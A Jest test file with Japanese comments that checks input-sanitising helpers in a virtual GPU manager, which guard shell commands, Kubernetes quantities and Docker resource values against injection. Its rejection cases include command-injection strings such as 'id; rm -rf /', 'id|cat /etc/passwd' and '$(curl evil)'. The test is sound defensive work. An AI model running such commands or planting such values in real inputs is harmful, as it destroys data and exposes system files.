// tests/vgpu-helpers.test.js
// virtual-gpu-manager.js の純粋バリデーション関数群の契約を固定する。
// sanitizeId / clampPercentage / safeK8sQuantity / safePositiveNumber は
// シェルコマンド・MPS スクリプト・k8s manifest・Docker リソースへ
// ユーザー由来値を埋め込む際の注入防止プリミティブ。

const { sanitizeId, clampPercentage, safeK8sQuantity, safePositiveNumber } = require('../virtual-gpu-manager');

describe('sanitizeId（シェル埋め込み識別子の検証）', () => {
  test('英数字・ハイフン・アンダースコア・ドット・コロンは通す', () => {
    expect(sanitizeId('vgpu-01_A.b:c')).toBe('vgpu-01_A.b:c');
    expect(sanitizeId('GPU-0')).toBe('GPU-0');
    expect(sanitizeId(123)).toBe('123');
  });

  test.each([
    'id; rm -rf /',
    'id|cat /etc/passwd',
    'id && whoami',
    '$(curl evil)',
    '`id`',
    'a b',
    "id'quote",
    'id"dquote',
    'id\nnewline',
    '',
    'id/slash',
    'id\\back',
    'id%percent',
    'id*star',
    'id?quest',
    'id!bang',
    'id@at',
    'id=eq',
  ])('危険文字を含む値を拒否する: %p', (v) => {
    expect(() => sanitizeId(v)).toThrow(/Invalid identifier/);
  });
});

describe('clampPercentage（0-100 クランプ）', () => {
  test('範囲内の値はそのまま', () => {
    expect(clampPercentage(50)).toBe(50);
    expect(clampPercentage('75')).toBe(75);
    expect(clampPercentage(0)).toBe(0);
    expect(clampPercentage(100)).toBe(100);
  });

  test('範囲外は 0/100 へクランプ', () => {
    expect(clampPercentage(-5)).toBe(0);
    expect(clampPercentage(250)).toBe(100);
  });

  test('非数値は既定値（既定 50、引数指定可）', () => {
    expect(clampPercentage('abc')).toBe(50);
    expect(clampPercentage('abc', 25)).toBe(25);
    expect(clampPercentage(undefined)).toBe(50);
    expect(clampPercentage(null, 10)).toBe(10);
    // null/'' は Number() で 0 になるが「未設定」を意味するためフォールバック。
    expect(clampPercentage(null)).toBe(50);
    expect(clampPercentage('')).toBe(50);
    expect(clampPercentage('   ')).toBe(50);
  });

  test('文字列のまま埋め込まれない（"50; cmd" 注入防止）', () => {
    expect(clampPercentage('50; rm -rf /')).toBe(50);
  });
});

describe('safeK8sQuantity（k8s quantity 検証）', () => {
  test('有効な quantity を通す', () => {
    for (const v of ['100', '1.5', '500m', '2Gi', '512Mi', '1Ti', '3k', '4M', '1.5Gi', '8Pi', '2Ei']) {
      expect(safeK8sQuantity(v, 'F')).toBe(v);
    }
  });

  test('無効な値はフォールバック', () => {
    for (const v of ['abc', '1.2.3', '10XB', '', '1 Mi', '-5', '0x10', '1e3', null, undefined, '1;rm']) {
      expect(safeK8sQuantity(v, 'F')).toBe('F');
    }
  });
});

describe('safePositiveNumber（Docker リソース検証）', () => {
  test('正の有限数は floor して返す', () => {
    expect(safePositiveNumber(1024.9, 1)).toBe(1024);
    expect(safePositiveNumber('2048', 1)).toBe(2048);
    expect(safePositiveNumber(0.7, 1)).toBe(0);
  });

  test('0・負・非有限はフォールバック', () => {
    for (const v of [0, -1, -0.5, 'abc', NaN, Infinity, null, undefined]) {
      expect(safePositiveNumber(v, 42)).toBe(42);
    }
  });
});
